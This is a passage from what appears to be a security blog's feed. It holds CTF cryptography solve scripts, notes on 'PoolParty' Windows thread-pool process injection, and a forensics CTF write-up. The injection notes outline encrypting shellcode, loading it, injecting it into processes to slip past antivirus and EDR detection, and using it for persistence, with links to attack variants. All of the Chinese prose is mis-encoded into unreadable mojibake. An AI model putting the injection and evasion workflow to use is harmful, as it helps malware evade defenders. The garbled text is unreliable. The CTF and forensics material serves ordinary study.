b&#x27;tf&#123;es72b!a5-njad!@-#!@$sad-6bysgwy-1adsw8&#125;\x00\x00&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;moectf&#123;es72b!a5-njad!@-#!@$sad-6bysgwy-1adsw8&#125;\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure>



<h4 id="5-moectf-ez-chain"><a href="#5-moectf-ez-chain" class="headerlink" title="5.moectf ez_chain"></a>5.moectf ez_chain</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;key.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    key = <span class="built_in">int</span>(fs.read().strip())</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    flag = fs.read().strip()</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">72</span></span><br><span class="line"> </span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"> </span><br><span class="line">base = bytes_to_long(<span class="string">b&quot;koito&quot;</span>)</span><br><span class="line">iv = <span class="number">3735927943</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blockize</span>(<span class="params">long</span>):</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">while</span> long &gt; <span class="number">0</span>:</span><br><span class="line">        out.append(long % base)</span><br><span class="line">        long //= base</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">reversed</span>(out))</span><br><span class="line"> </span><br><span class="line">blocks = blockize(m)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_block_cbc</span>(<span class="params">blocks, iv, key</span>):</span><br><span class="line">    encrypted = [iv]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(blocks)):</span><br><span class="line">        encrypted.append(blocks[i] ^ encrypted[i] ^ key)</span><br><span class="line">    <span class="keyword">return</span> encrypted[<span class="number">1</span>:]</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(encrypt_block_cbc(blocks, iv, key))</span><br><span class="line"><span class="comment"># [8490961288, 122685644196, 349851982069, 319462619019, 74697733110, 43107579733, 465430019828, 178715374673, 425695308534, 164022852989, 435966065649, 222907886694, 420391941825, 173833246025, 329708930734]</span></span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®åˆ†æï¼š</p>
<p>1.flag 72ä½ï¼Œmä¸ºflag éœ€æ±‚é¡¹</p>
<p>2.éœ€è¦å†™2ä¸ªè§£å¯†å‡½æ•° decrypt_block_cbc å’Œ deblockize</p>
<p>K = å¯†æ–‡å— ^ æ˜æ–‡å— ^ iv</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">base = bytes_to_long(<span class="string">b&quot;koito&quot;</span>)</span><br><span class="line">iv = <span class="number">3735927943</span></span><br><span class="line"> </span><br><span class="line">blocks = [<span class="number">8490961288</span>, <span class="number">122685644196</span>, <span class="number">349851982069</span>, <span class="number">319462619019</span>, <span class="number">74697733110</span>, <span class="number">43107579733</span>, <span class="number">465430019828</span>, <span class="number">178715374673</span>, <span class="number">425695308534</span>, <span class="number">164022852989</span>, <span class="number">435966065649</span>, <span class="number">222907886694</span>, <span class="number">420391941825</span>, <span class="number">173833246025</span>, <span class="number">329708930734</span>]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blockize</span>(<span class="params">long</span>):</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">while</span> long &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># å–ä½™æ•° å­˜å…¥ out</span></span><br><span class="line">        out.append(long % base)</span><br><span class="line">        long //= base</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">reversed</span>(out))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deblockize</span>(<span class="params">blocks</span>):</span><br><span class="line">    out = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> blocks:</span><br><span class="line">        out = out * base + block</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_block_cbc</span>(<span class="params">blocks, iv, key</span>):</span><br><span class="line">    encrypted = [iv]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(blocks)):</span><br><span class="line">        encrypted.append(blocks[i] ^ encrypted[i] ^ key)</span><br><span class="line">    <span class="keyword">return</span> encrypted[<span class="number">1</span>:]</span><br><span class="line"><span class="comment"># blocks[0] ^ iv ^ key =  flag[0]</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_block_cbc</span>(<span class="params">blocks, iv, key</span>):</span><br><span class="line">    <span class="comment"># iv åˆå§‹åŒ–å‘é‡</span></span><br><span class="line">    encrypted = [iv, *blocks]</span><br><span class="line">    decrypted = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(blocks)):</span><br><span class="line">        decrypted.append(encrypted[i] ^ encrypted[i + <span class="number">1</span>] ^ key)</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"> </span><br><span class="line"><span class="comment">#  flag = moectf&#123;xxx&#125;</span></span><br><span class="line"><span class="comment">#  72ä¸ªå­—ç¬¦  å…¶ä¸­ moectf 6 &#123;&#125; 2  72-2-6=64ä¸ª</span></span><br><span class="line"><span class="comment">#  flag[0] = blocks[0] ^ key ^ iv</span></span><br><span class="line"><span class="comment">#  key = iv ^ blocks[0] ^ flag[0]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>,blockize(bytes_to_long(<span class="string">b&quot;moectf&#123;&quot;</span> + <span class="string">b&quot;0&quot;</span>*<span class="number">64</span> + <span class="string">b&quot;&#125;&quot;</span>))[<span class="number">0</span>] )</span><br><span class="line"><span class="comment"># print(blockize(bytes_to_long(b&quot;moectf&#123;&quot; + b&quot;0&quot;*64 + b&quot;&#125;&quot;)))</span></span><br><span class="line">key = blockize(bytes_to_long(<span class="string">b&quot;moectf&#123;&quot;</span> + <span class="string">b&quot;0&quot;</span>*<span class="number">64</span> + <span class="string">b&quot;&#125;&quot;</span>))[<span class="number">0</span>] ^ iv ^ blocks[<span class="number">0</span>]</span><br><span class="line">m = long_to_bytes(deblockize(decrypt_block_cbc(blocks, iv, key)))</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;key:&quot;</span>,key)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure>



<h4 id="6-Afctf-MyOwnCBC"><a href="#6-Afctf-MyOwnCBC" class="headerlink" title="6.Afctf MyOwnCBC"></a>6.Afctf MyOwnCBC</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MyOwnCBC</span>(<span class="params">key, plain</span>):</span><br><span class="line">  <span class="comment"># key 32ä½  ä½†keyæœªçŸ¥</span></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(key)!=<span class="number">32</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;error!&quot;</span></span><br><span class="line">	cipher_txt = <span class="string">b&quot;&quot;</span></span><br><span class="line">	cipher_arr = []</span><br><span class="line">	<span class="comment"># è‡ªå®šä¹‰åŠ å¯† ECB </span></span><br><span class="line">	cipher = AES.new(key, AES.MODE_ECB, <span class="string">&quot;&quot;</span>)</span><br><span class="line">	<span class="comment"># ç­‰ä»·äº cipher = AES.new(key, AES.MODE_ECB)</span></span><br><span class="line">	plain = [plain[i:i+<span class="number">32</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(plain), <span class="number">32</span>)]</span><br><span class="line">  	<span class="comment"># 32ä½(16å­—èŠ‚)ä¸ºä¸€ç»„ ç„¶åè¿›è¡ŒECBåŠ å¯†</span></span><br><span class="line">	<span class="built_in">print</span> plain</span><br><span class="line">  	<span class="comment"># åŠ å¯†å å­˜å…¥å¯†æ–‡æ•°ç»„ 	</span></span><br><span class="line">	cipher_arr.append(cipher.encrypt(plain[<span class="number">0</span>]))</span><br><span class="line">	cipher_txt += cipher_arr[<span class="number">0</span>]</span><br><span class="line">	</span><br><span class="line">  	<span class="comment"># cipher_txt = [cipher_arr[i]] 	</span></span><br><span class="line">  	<span class="comment"># ä¸Šä¸€ä¸ªå¯†æ–‡ ä½œä¸º ä¸‹ä¸€ä¸ªå¯†æ–‡çš„å¯†é’¥keyè¿›è¡ŒåŠ å¯†</span></span><br><span class="line">  	<span class="comment"># key0 ä¸ºç¬¬ä¸€ç»„çš„å¯†æ–‡ å³ key0 = cipher[0:32]</span></span><br><span class="line">	<span class="comment"># ç„¶åä»¥ å‰ä¸€ä¸ª cipher_arr[i-1]ä½œä¸ºkey è¿›è¡ŒecbåŠ å¯†</span></span><br><span class="line">	<span class="comment">#   cipher_arr[i-1] ^ cipher_arr[i]</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(plain)):</span><br><span class="line">		cipher = AES.new(cipher_arr[i-<span class="number">1</span>], AES.MODE_ECB, <span class="string">&quot;&quot;</span>)</span><br><span class="line">		cipher_arr.append(cipher.encrypt(plain[i]))</span><br><span class="line">		cipher_txt += cipher_arr[i]</span><br><span class="line">	<span class="keyword">return</span> cipher_txt</span><br><span class="line">	</span><br><span class="line"><span class="comment"># ç”Ÿæˆ256ä½çš„éšæœºæ•´æ•°	</span></span><br><span class="line">key = random.getrandbits(<span class="number">256</span>)</span><br><span class="line">key = long_to_bytes(key)</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	s = f.read()</span><br><span class="line">	f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯†æ–‡å†™å…¥åˆ°flag_cipher æ˜¯å·²çŸ¥é¡¹</span></span><br><span class="line"><span class="comment"># é•¿åº¦ä¸º 6A0h = 1696</span></span><br><span class="line"><span class="comment"># 1696 / 32 = 53ç»„</span></span><br><span class="line"><span class="comment"># ç”±äºä¸Šä¸€ä¸ªå¯†æ–‡ä½œä¸ºkey å‚ä¸ä¸‹ä¸€æ¬¡å¯†æ–‡åŠ å¯† æ‰€ä»¥é•¿åº¦éƒ½ç›¸åŒ</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag_cipher&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(MyOwnCBC(key, s))</span><br><span class="line">	f.close()</span><br></pre></td></tr></table></figure>

<p>plain = [plain[i:i+32] for i in range(0, len(plain), 32)] # 32ä½ä¸€ç»„</p>
<p>ç¬¬ä¸€æ¬¡å¯†æ–‡ ä½œä¸ºå¯†é’¥key0å‚ä¸ECBåŠ å¯†  key = cipher[:32]</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag_cipher&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="comment"># print(len(fp.read()))</span></span><br><span class="line">    cipher = fp.read()</span><br><span class="line">    fp.close()</span><br><span class="line"></span><br><span class="line">key0 = cipher[:<span class="number">32</span>]</span><br><span class="line"><span class="built_in">print</span>(key0)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MyOwnCBC</span>(<span class="params">key0,cipher</span>):</span><br><span class="line">    cipher = [cipher[i:i + <span class="number">32</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher), <span class="number">32</span>)]</span><br><span class="line">    m = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    tmpkey = key0</span><br><span class="line">	<span class="comment"># ä¸Šä¸€æ¬¡çš„å¯†æ–‡ä½œä¸ºkeyå‚ä¸ä¸‹ä¸€æ¬¡ECB</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(cipher)):</span><br><span class="line">        aes = AES.new(tmpkey,AES.MODE_ECB)</span><br><span class="line">        m += aes.decrypt(cipher[i])</span><br><span class="line">        tmpkey = cipher[i]</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(MyOwnCBC(key0,cipher))</span><br><span class="line"><span class="comment">#b&#x27;\xe5\xdf\x94sJ\xc2\xcd\x04\xeb\xb7\xcf\x05(\xbe\x98\\\xe9\xc3^\x1f!\xfb\xea6\xdac\x1f\xfe\x901\xbb\x13&#x27;</span></span><br><span class="line"><span class="comment">#b&quot;mode of operation is an algorithm that uses a block cipher to provide an information service such as confidentiality or authenticity. A block cipher by itself is only suitable for the secure cryptographic transformation (encryption or decryption) of one fixed-length group of bits called a block. A mode of operation describes how to repeatedly apply a cipher&#x27;s single-block operation to securely transform amounts of data larger than a block.\n\nMost modes require a unique binary sequence, often called an initialization vector (IV), for each encryption operation. The IV has to be non-repeating and, for some modes, random as well. The initialization vector is used to ensure distinct ciphertexts are produced even when the same plaintext is encrypted multiple times independently with the same key. Block ciphers have one or more block size(s), but during transformation the block size is always fixed. Block cipher modes operate on whole blocks and require that the last part of the data be padded to a full block if it is smaller than the current block size. There are, however, modes that do not require padding because they effectively use a block cipher as a stream cipher.\n\nHistorically, encryption modes have been studied extensively in regard to their error propagation properties under various scenarios of data modification. Later development regarded integrity protection as an entirely separate cryptographic goal. Some modern modes of operation combine confidentiality and authenticity in an efficient way, and are known as authenticated encryption modes.\n\nAh you found it~ afctf&#123;Don&#x27;t_be_fooled_by_yourself&#125;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n&quot;</span></span><br></pre></td></tr></table></figure>





<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://bbs.kanxue.com/thread-253884.htm">https://bbs.kanxue.com/thread-253884.htm</a></p>
<p><a href="https://www.cxyxiaowu.com/3239.html">https://www.cxyxiaowu.com/3239.html</a></p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>PoolParty_Windowsçº¿ç¨‹æ± æ³¨å…¥</title>
    <url>/posts/df681750/</url>
    <content><![CDATA[<p>å‚è€ƒæ–‡ç« </p>
<p><a href="https://mp.weixin.qq.com/s/GEZZ5XPmbJ39c5i9GmvxRA">https://mp.weixin.qq.com/s/GEZZ5XPmbJ39c5i9GmvxRA</a></p>
<p><a href="https://xz.aliyun.com/t/13184">https://xz.aliyun.com/t/13184</a> è¿™ç¯‡æ–‡ç« ä¹Ÿä¸é”™ å¯¹åŸæ–‡çš„ç¿»è¯‘</p>
<p><a href="https://github.com/SafeBreach-Labs/PoolParty">https://github.com/SafeBreach-Labs/PoolParty</a></p>
<p>å› ä¸ºä¹‹å‰æ²¡å»è¯¦ç»†æ¥è§¦è¿‡Windowsæ ¸å¿ƒç¼–ç¨‹ çº¿ç¨‹æ± è¿™äº›çš„ æ‰€ä»¥å†çœ‹æ–‡ç« çš„æ—¶å€™æœ‰ç‚¹åœ°æ–¹ä¸å¤ªå¥½æ‡‚ã€‚ã€‚</p>
<p>çœ‹äº†ä¸‹åŸé¡¹ç›®ä½œè€…çš„ä»£ç ä¹Ÿå¾ˆéš¾æ‡‚ <a href="https://github.com/0xEr3bus/PoolPartyBof">https://github.com/0xEr3bus/PoolPartyBof</a> è¿™ä¸ªbofçš„é¡¹ç›®åˆ™ç›¸å¯¹å¥½ç†è§£äº›</p>
<p>å¯ä»¥ç”¨æƒé™ç»´æŒæ—¶ä½¿ç”¨è¯¥bofæ³¨å…¥è¿›ç¨‹</p>
<p>ç°åœ¨æ„Ÿè§‰æœ‰æ—¶å€™bofç¡®å®è¦å¥½ç”¨äº› ä¸è¿‡è‡ªå·±å†™èµ·æ¥è°ƒè¯•å¤ªéº»çƒ¦ ï¼š|</p>
<p><a href="https://mp.weixin.qq.com/s/GEZZ5XPmbJ39c5i9GmvxRA">https://mp.weixin.qq.com/s/GEZZ5XPmbJ39c5i9GmvxRA</a> è¿™ç¯‡ä¹Ÿè§£é‡Šäº†å®ç°æ–¹æ³•ï¼Œå¹¶å°†bofé¡¹ç›®çš„ä»£ç ç¨åŠ ä¿®æ”¹æˆcï¼Œ</p>
<p>é€šè¿‡pythonå¯¹shellcode åˆ©ç”¨aes 32ä½éšæœºkeyè¿›è¡ŒåŠ å¯†åè½¬base64ç”Ÿæˆsc.hæ–‡ä»¶</p>
<p>![image-20240204135246901](/Users/mamor/Library/Application Support/typora-user-images/image-20240204135246901.png)</p>
<p>æ”¾åˆ°loaderzä¸­è§£å¯†å³å¯ ç„¶å åˆ©ç”¨poolpartyè¿›è¡Œè¿›ç¨‹æ³¨å…¥ã€å½“ç„¶åœ¨æ³¨å…¥æ—¶ æ€è½¯å¯èƒ½ä¼šå¯¹Explorer.exeç­‰ä¸¥æ ¼æŠŠæ§ï¼Œéœ€æ ¹æ®æƒ…å†µé€‰æ‹©æ³¨å…¥è¿›ç¨‹ã€‘</p>
<p>å¸¸è§çš„ä»£ç æ³¨å…¥ ä¸»è¦åˆ†ä¸‰æ­¥ï¼š åˆ†é…/ä¿®æ”¹ç©ºé—´ã€å†™å…¥shellcodeã€æ‰§è¡Œè¿›ç¨‹/çº¿ç¨‹</p>
<p>æ­£å¸¸æƒ…å†µä¸‹ ç”³è¯·å†…å®¹ç©ºé—´æˆ–å†™å…¥shellcodeå¹¶ä¸ä¼šè¢«ç®¡æ§ï¼Œæ€è½¯ä¼šåœ¨æ‰§è¡Œè¿›ç¨‹/çº¿ç¨‹æ—¶è¿›è¡Œä¸¥æ ¼ç›‘æ§ã€‚</p>
<p>poolparty ä¸»è¦åˆ©ç”¨ç”¨æˆ·æ€ä¸‹ Windowsçš„å¯ä¿¡çº¿ç¨‹æ± æœºåˆ¶ è§£å†³äº†æ‰§è¡Œæ—¶çš„é—®é¢˜ï¼Œä»¥è§„é¿æ€è½¯EDRçš„æ£€æµ‹ã€‚</p>
<p>![image-20240204135230477](/Users/mamor/Library/Application Support/typora-user-images/image-20240204135230477.png)</p>
<p>çœ‹äº†ä¸‹bofä¸­çš„ä»£ç æ€è·¯ï¼š</p>
<p>1.è·å–è¿›ç¨‹PID</p>
<p>2.åŠ«æŒå¥æŸ„</p>
<p>3.ç”³è¯·shellcodeçš„å†…å­˜ç©ºé—´</p>
<p>4.å†™å…¥shellcode</p>
<p>5.æ‰§è¡Œã€ä¸»è¦åœ¨è¿™æ­¥ä¸­æœ‰æ‰€åŒºåˆ«ã€‘ è¿™é‡Œæ²¡å…·ä½“äº†è§£è¿‡è¯¦ç»†çš„Windowsçº¿ç¨‹æ± ï¼Œæ‰€ä»¥æœ‰äº›ä»£ç çœ‹ä¸Šå»æœ‰äº›å›°éš¾[éœ€è¦å†èŠ±è´¹ç²¾åŠ›å»æ‰¾ç›¸å…³æ–‡æ¡£</p>
<p>åœ¨bofä¸­ç»™å‡ºäº†5ç§é¢å¤–çš„æ–¹å¼</p>
<p><a href="https://github.com/0xEr3bus/PoolPartyBof/blob/main/src/Varient_4.c">https://github.com/0xEr3bus/PoolPartyBof/blob/main/src/Varient_4.c</a> TP_IO</p>
<p><a href="https://github.com/0xEr3bus/PoolPartyBof/blob/main/src/Varient_5.c">https://github.com/0xEr3bus/PoolPartyBof/blob/main/src/Varient_5.c</a> TP_ALPC</p>
<p><a href="https://github.com/0xEr3bus/PoolPartyBof/blob/main/src/Varient_6.c">https://github.com/0xEr3bus/PoolPartyBof/blob/main/src/Varient_6.c</a> TP_JOB</p>
<p><a href="https://github.com/0xEr3bus/PoolPartyBof/blob/main/src/Varient_7.c">https://github.com/0xEr3bus/PoolPartyBof/blob/main/src/Varient_7.c</a> TP_DIRECT</p>
<p><a href="https://github.com/0xEr3bus/PoolPartyBof/blob/main/src/Varient_8.c">https://github.com/0xEr3bus/PoolPartyBof/blob/main/src/Varient_8.c</a> TP_TIMER</p>
]]></content>
  </entry>
  <entry>
    <title>æŸç”µå­å–è¯WP</title>
    <url>/posts/657ea34/</url>
    <content><![CDATA[<p><strong>é¢˜ç›®2-1</strong>ï¼ˆæœ¬é¢˜3åˆ†ï¼‰</p>
<p>æå–æ£€æå‹ç¼©åŒ…çš„SHA256å€¼ï¼Œä»¥æ­¤ä½œä¸ºflagæäº¤ã€‚</p>
<p>Certutil -hashfile æ£€æ2.rar sha256</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063429362-1a67e38b-0e1e-4828-a659-56876aeecaa3.png" alt="img"></p>
<p><strong>é¢˜ç›®2-2</strong>ï¼ˆæœ¬é¢˜7åˆ†ï¼‰</p>
<p>ç ´è§£è¯¥æ£€æç³»ç»Ÿçš„ç”¨æˆ·ååŠå¯†ç ï¼ˆå‡ä¸º8ä½ä»¥å†…è‹±æ–‡åŠ æ•°å­—çš„å¼±å£ä»¤ï¼‰ï¼Œå¹¶ä»¥å¯†ç ä½œä¸ºflagæäº¤ã€‚</p>
<p>FTKæŒ‚è½½VMDK </p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063439315-07401b81-cc1e-4cba-892f-1eec9270cb89.png" alt="img"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063449489-a66c8029-1fac-4691-8b0a-1d9190603c09.png" alt="img"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063456770-ca6478e3-73f7-4e02-89f6-47c311c2880c.png" alt="img"></p>
<p>md5è§£å¯† å¾—åˆ° admin888</p>
<p><strong>é¢˜ç›®2-3</strong>ï¼ˆæœ¬é¢˜2åˆ†ï¼‰</p>
<p>æå–è¯¥æ£€æç³»ç»Ÿçš„ç‰ˆæœ¬å·ï¼Œä»¥æ­¤ä½œä¸ºflagæäº¤ã€‚ï¼ˆç¤ºä¾‹ï¼š11.11ï¼‰</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063470195-42b2c668-e645-4a72-833f-2d281c594d1a.png" alt="img"></p>
<p>ä¹Ÿå¯é€šè¿‡FTKç¿»æ–‡ä»¶æ‰¾åˆ° os-relaease </p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063514798-957a81f6-45e0-4df5-a857-2b2ff8b472a0.png" alt="img"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063522642-77dc82e6-fa38-474f-9492-bfe25a1b3652.png" alt="img"></p>
<p>16.04</p>
<p><strong>é¢˜ç›®2-4</strong>ï¼ˆæœ¬é¢˜3åˆ†ï¼‰</p>
<p>æå–è¯¥æ£€æçš„ç½‘ç«™æ–‡ä»¶ç›®å½•ï¼Œä»¥æ­¤ä½œä¸ºflagæäº¤ã€‚</p>
<p>/home/admin888/fund</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063537576-690bc4a2-cda6-4097-b46e-7eede13e6b1a.png" alt="img"></p>
<p><strong>é¢˜ç›®2-5</strong>ï¼ˆæœ¬é¢˜3åˆ†ï¼‰</p>
<p>æå–ç½‘ç«™å¯¹åº”çš„æ•°æ®åº“æ–‡ä»¶åï¼Œä»¥æ­¤ä½œä¸ºflagæäº¤ã€‚</p>
<p>ä¸Šä¸€é—®ä¸­å‘ç°å­˜åœ¨ db.sqlite3 æ•°æ®åº“æ–‡ä»¶  æ‰€ä»¥ flag{db.sqlite3}</p>
<p><strong>é¢˜ç›®3-1</strong>ï¼ˆæœ¬é¢˜3åˆ†ï¼‰</p>
<p>1.æ¢å¤è¯¥æ£€ææ•°æ®ï¼Œæ‰¾å‡ºè¢«åˆ é™¤çš„logæ–‡ä»¶ï¼Œå¹¶ä»¥æ­¤ä½œä¸ºflagæäº¤ã€‚ï¼ˆä¸å«åç¼€åï¼‰ï¼ˆ3åˆ†ï¼‰</p>
<p>ftkç›´æ¥æŒ‚è½½ å‘ç°logæ–‡ä»¶</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063561645-0ce8fe9f-c8a7-4f55-badc-67af3bb1988e.png" alt="img"></p>
<p><strong>é¢˜ç›®3-2</strong>ï¼ˆæœ¬é¢˜7åˆ†ï¼‰</p>
<p>åˆ†ææ—¥å¿—æ–‡ä»¶ï¼Œåˆ†ææ•°æ®åº“sys_userè¡¨çš„æ’å…¥æ“ä½œæ¬¡æ•°ï¼Œå¹¶ä»¥æ­¤ä½œä¸ºflagæäº¤ã€‚</p>
<p>æŸ¥çœ‹æ–‡ä»¶ä¸­INSERT INTO <code>sys_user</code> VALUES å‡ºç°çš„æ¬¡æ•°ï¼š</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063585322-eb9df81a-e672-45f3-a2a6-c76f45705a4f.png" alt="img"></p>
<p>flag{344}</p>
<p><strong>é¢˜ç›®3-3</strong>ï¼ˆæœ¬é¢˜3åˆ†ï¼‰</p>
<p>åˆ†ææ“ä½œæ—¥å¿—ï¼Œå‘ç°æœ‰å­¦ç”Ÿçš„æ‰‹æœºå·è¢«ä¿®æ”¹ï¼Œä»¥æ­¤å­¦ç”Ÿå§“åä½œä¸ºflagæäº¤ã€‚</p>
<p>çœ‹åˆ°è¿˜æœ‰ä¸ªmysql-bin.000001æ–‡ä»¶ ï¼Œå¯¼å‡ºè¿›è¡ŒæŸ¥çœ‹</p>
<p>é¢˜ç›®ä¸­è¯´çš„æ˜¯æ›´æ–°æ“ä½œï¼Œç¬¬ä¸€ä¸ªæƒ³åˆ°çš„æ˜¯UPDATEæ“ä½œï¼Œå…¨å±€æœç´¢UPDATEï¼Œå‘ç°åªæœ‰ä¸¤æ¬¡å‡ºç°ï¼š</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063620464-b00ceccb-369f-41b0-8bc6-efbd2baf872b.png" alt="img"></p>
<p>åä¸€ä¸ªä¸ºæ›´æ–°studentæ‰‹æœºå·æ“ä½œï¼š</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063635900-36d0c04d-7c1f-4de3-9e95-2c8c083edd9b.png" alt="img"></p>
<p>æ›´æ–°çš„student è¡¨ä¸­çš„å­—æ®µ idä¸º1 ï¼Œ å°è¯•å®šä½Studentè¡¨ã€ç›´æ¥å…¨å±€æœç´¢studentã€‘ï¼š</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063652321-10d9e32f-4646-4b94-9865-def60ecbe795.png" alt="img"></p>
<p>flag{å¼ ä¸‰}</p>
<p><strong>é¢˜ç›®4-1</strong>ï¼ˆæœ¬é¢˜3åˆ†ï¼‰</p>
<p>æ¢å¤è¯¥æ£€ææ•°æ®ï¼Œæ‰¾å‡ºè¢«åˆ é™¤çš„æ–‡ä»¶ï¼Œå¹¶ä»¥æ­¤æ–‡ä»¶åä½œä¸ºflagæäº¤ã€‚ï¼ˆä¸å«åç¼€åï¼‰</p>
<p>é€šè¿‡R-STUDIOæ‰“å¼€é•œåƒ ç¿»ç£ç›˜æ‰¾åˆ° è®°è´¦2022.6.xls</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063707331-ea450272-1b10-4bf8-bd59-0594ce0eeaa0.png" alt="img"></p>
<p>FTKåŠ è½½ä¹Ÿå¯ä»¥ç›´æ¥æ‰¾åˆ°</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22657900/1703063734888-a5c6f87d-b93d-4360-9828-417b5f763a23.png" alt="img"></p>
<p>flag{è®°è´¦2022.6}</p>
<p><strong>é¢˜ç›®4-2</strong>ï¼ˆæœ¬é¢˜7åˆ†ï¼‰</p>
<p>åˆ†æè¢«åˆ é™¤çš„æ–‡ä»¶ï¼Œç ´è§£æ–‡ä»¶å¯†ç ï¼ˆå¯†ç ä¸ºä»¥qwå¼€å¤´çš„10ä½å°å†™è‹±æ–‡åŠ æ•°å­—ï¼‰ï¼Œå¹¶ä»¥æ­¤ä½œä¸ºflagæäº¤ã€‚</p>
<p>shabé¢˜ç›® è®©çˆ†ç ´å¯†ç </p>
